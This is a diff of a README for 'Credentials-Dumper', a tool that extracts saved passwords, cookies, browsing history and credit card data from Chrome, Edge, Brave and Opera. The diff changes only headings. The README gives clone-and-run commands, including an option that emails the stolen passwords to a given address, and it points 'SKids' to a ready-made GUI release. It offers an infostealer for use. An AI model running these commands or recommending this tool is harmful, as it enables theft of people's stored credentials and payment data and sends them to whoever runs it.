@@ -9,15 +9,14 @@ A Tool That Display Browsers Credentials on your terminal
 | Chrome |  ✅ | ✅  | ✅ | ✅
 | Microsoft Edge |  ✅ | ✅  | ✅ | ✅
 | Brave |  ✅ | ✅  | ✅ | ✅
-## Usage:
-### Terminal/cmd:
+## Usage Terminal:
 ```
 git clone https://github.com/SHBBL/Credentials-Dumper.git
 pip3 install -r requirements.txt
 cd Credentials-Dumper && cd windows
 python Credentials_Dumper.py -h
 ```
-#### Options:
+### Options:
 ```
   -h, --help            show this help message and exit
   -browser , --browser  Browser Name: chrome/msedge/brave/opera
@@ -25,7 +24,7 @@ python Credentials_Dumper.py -h
   -send , --send        Select: passwords/cookies/history/creditcards
   -to , --to            Send: passwords/cookies/history/creditcards to email
 ```
-## Example:
+### Example:
 ### Dump it on screen:
 ``
 python Credentials_Dumper.py -browser msedge -get passwords
@@ -39,5 +38,5 @@ python Credentials_Dumper.py -browser msedge -send passwords -to example@example
 ``
 #### Output:
 Check Your spam or inbox
-### GUI:
+### Usage GUI:
 For SKids go to [RELEASES](https://github.com/SHBBL/Credentials-Dumper/releases/tag/v1.0)
